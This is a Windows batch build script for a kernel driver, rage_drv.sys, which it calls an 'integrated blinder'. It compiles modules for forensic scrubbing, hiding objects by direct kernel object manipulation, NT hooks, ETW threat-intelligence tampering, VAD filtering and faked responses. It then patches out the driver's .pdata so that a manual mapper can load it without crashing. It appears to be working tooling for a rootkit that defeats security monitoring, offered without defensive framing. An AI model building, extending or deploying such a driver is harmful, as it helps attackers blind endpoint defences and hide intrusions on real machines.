@echo off
rem Build rage_drv.sys (integrated blinder) from Windows Driver Kit 10 + VS 2022.
rem Run from "x64 Native Tools Command Prompt for VS 2022" (or run _do_build.bat
rem which auto-invokes vcvarsall first).

setlocal ENABLEDELAYEDEXPANSION

if not defined WindowsSdkDir (
    echo ERROR: Windows SDK not in environment. Open the x64 Native Tools
    echo        Command Prompt for VS 2022 and re-run from there.
    exit /b 1
)

for /f "delims=" %%v in ('dir /b /ad /on "!WindowsSdkDir!Include\10.0.*"') do set "SDK_VER=%%v"
if not defined SDK_VER (
    echo ERROR: No Windows SDK 10 includes found under "!WindowsSdkDir!Include"
    exit /b 1
)

set "WDK_INC=!WindowsSdkDir!Include\!SDK_VER!"
set "WDK_LIB=!WindowsSdkDir!Lib\!SDK_VER!"

set INCLUDES=/I"!WDK_INC!\km" /I"!WDK_INC!\km\crt" /I"!WDK_INC!\shared" /I"!WDK_INC!\ucrt"
set LIBS="!WDK_LIB!\km\x64\ntoskrnl.lib" "!WDK_LIB!\km\x64\hal.lib" "!WDK_LIB!\km\x64\BufferOverflowFastFailK.lib"

set CFLAGS=/nologo /c /O2 /W3 /kernel /GS- /Zc:wchar_t /D_WIN64 /D_AMD64_ /DAMD64 /D_X86_AMD64_ /DWIN32_LEAN_AND_MEAN /D_WINNT
set CFLAGS=!CFLAGS! /D__INTRINSIC_GROUP_WIN_BASE=1
rem Set BLINDER_DIAG=1 as an env var before running to produce a diag
rem build (skips Resolve/Scrub/Etwti/VadFilter/ResponseFaker/Dkom; only
rem installs NtHooks + ObCallback). Isolates which pattern-scan hangs.
if "%BLINDER_DIAG%"=="1" (
    set CFLAGS=!CFLAGS! /DBLINDER_DIAG=1
    echo [+] DIAG mode: skipping pattern-scan subsystems
)
if "%BLINDER_SKIP_NT%"=="1" (
    set CFLAGS=!CFLAGS! /DBLINDER_SKIP_NT=1
    echo [+] SKIP_NT: skipping NtHooks_Install
)
if "%BLINDER_SKIP_OB%"=="1" (
    set CFLAGS=!CFLAGS! /DBLINDER_SKIP_OB=1
    echo [+] SKIP_OB: skipping ObCallback_Install
)

for %%f in (main.c forensic_scrub.c dkom_hide.c nt_hooks.c ob_callback.c etwti.c vad_filter.c response_faker.c utils.c) do (
    echo [cl] %%f
    cl !CFLAGS! !INCLUDES! %%f
    if errorlevel 1 (
        echo BUILD FAILED on %%f
        exit /b 1
    )
)

set LDFLAGS=/nologo /DRIVER /ENTRY:DriverEntry /SUBSYSTEM:NATIVE,10.0 /NODEFAULTLIB /INCREMENTAL:NO
set LDFLAGS=!LDFLAGS! /RELEASE /OPT:REF,ICF /MACHINE:X64 /STACK:0x40000,0x1000 /ALIGN:0x1000

echo [link] rage_drv.sys
link !LDFLAGS! main.obj forensic_scrub.obj dkom_hide.obj nt_hooks.obj ob_callback.obj etwti.obj vad_filter.obj response_faker.obj utils.obj !LIBS! /OUT:rage_drv.sys
if errorlevel 1 (
    echo LINK FAILED
    exit /b 1
)

del /q *.obj 2>nul
del /q rage_drv.exp 2>nul
del /q rage_drv.lib 2>nul

rem --- CRITICAL: strip .pdata data directory ------------------------------
rem BSOD 0xE4 root cause: RAGE mapper calls nt!RtlInsertInvertedFunctionTable
rem on any payload with .pdata, inserting an entry that corrupts kernel
rem exception-unwind path → doubled worker item → bugcheck. Fix: zero
rem OptionalHeader.DataDirectory[3] so the mapper's directory read
rem returns 0 and it skips the RIFT call.
echo [strip_pdata] patching rage_drv.sys
where python >nul 2>&1 && (
    python strip_pdata.py rage_drv.sys
) || (
    where py >nul 2>&1 && py strip_pdata.py rage_drv.sys || (
        echo WARNING: python not found — rage_drv.sys WILL CRASH if mapper calls RIFT
    )
)

echo.
echo Built rage_drv.sys
dir /b rage_drv.sys
